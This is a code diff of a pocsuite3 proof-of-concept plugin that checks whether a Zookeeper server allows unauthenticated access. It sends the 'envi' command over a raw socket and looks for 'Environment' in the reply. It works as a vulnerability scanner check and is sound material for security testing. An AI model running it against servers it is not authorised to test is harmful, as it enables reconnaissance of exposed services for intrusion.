@@ -1,69 +1,75 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from pocsuite3.api import register_poc
-from pocsuite3.api import Output
-from pocsuite3.api import POCBase
-from pocsuite3.api import logger
-from urllib.parse import urlparse
+# @File : zookeeper_unauthorized_access.py
+# @Author : Norah C.IV
+# @Time : 2022/5/6 10:18
+# @Software: PyCharm
 import socket
-from collections import OrderedDict
-from pocsuite3.api import OptString
 
-class Zookeeper(POCBase):
-    vulID = ''
-    version = '1.0'
-    author = ['big04dream']
-    vulDate = '2019-11-05'
-    createDate = '2019-11-05'
-    updateDate = '2019-11-05'
+from pocsuite3.lib.core.enums import VUL_TYPE, POC_CATEGORY
+from pocsuite3.lib.core.poc import POCBase, Output
+from pocsuite3.lib.core.register import register_poc
+
+
+class DemoPOC(POCBase):
+    vulID = '2'
+    version = '1'
+    author = ['Norah C.IV']
+    vulDate = '2022-05-06'
+    createDate = '2022-05-06'
+    updateDate = '2022-05-06'
     references = ['']
-    name = 'Zookeeper Unauthorized access'
-    appPowerLink = 'https://zookeeper.apache.org/'
+    name = 'Zookeeper 未授权访问'
+    appPowerLink = ''
     appName = 'Zookeeper'
-    appVersion = 'all'
-    vulType = 'Unauthorized access'
+    appVersion = 'All'
+    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
     desc = '''
-    Zookeeper Unauthorized access
+    Zookeeper安装部署后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper
+    集群内进行破坏
     '''
-
-    def _options(self):
-        o = OrderedDict()
-        o['port'] = OptString('', description='这个poc需要输入端口', require=False)
-        return o
+    samples = ['']
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+    protocol = POC_CATEGORY.PROTOCOL.ZOOKEEPER
 
     def _verify(self):
         result = {}
-        try:
-            socket.setdefaulttimeout(10)
-            host = urlparse(self.url).hostname
-            port = self.get_option('port')
-            if port:
-                port = int(port)
-            else:
-                port = 2181
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
-            payload = b'envi'
-            s.send(payload)
-            data = s.recv(1024)
-            s.close()
-            if b'Environment' in data:
-                result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = host
-                result['VerifyInfo']['Payload'] = payload
-        except Exception as e:
-            logger.info(e)
-        return self.parse_output(result)
+        host = self.getg_option("rhost")
+        port = self.getg_option("rport") or 2181
+
+        if zookeeper_check(host, port, 3):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['Info'] = "Zookeeper未授权访问"
+            result['VerifyInfo']['Host'] = host
+        return self.parse_attack(result)
 
     def _attack(self):
         return self._verify()
 
-    def parse_output(self, result):
+    def parse_attack(self, result):
         output = Output(self)
+
         if result:
             output.success(result)
         else:
-            output.fail('not vulnerability')
+            output.fail('target is not vulnerable')
+
         return output
 
-register_poc(Zookeeper)
+
+def zookeeper_check(host, port, timeout):
+    try:
+        socket.setdefaulttimeout(timeout)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, int(port)))
+        flag = b'envi'
+        s.send(flag)
+        data = s.recv(1024)
+        s.close()
+        if 'Environment' in str(data):
+            return True
+    except:
+        return False
+
+
+register_poc(DemoPOC)
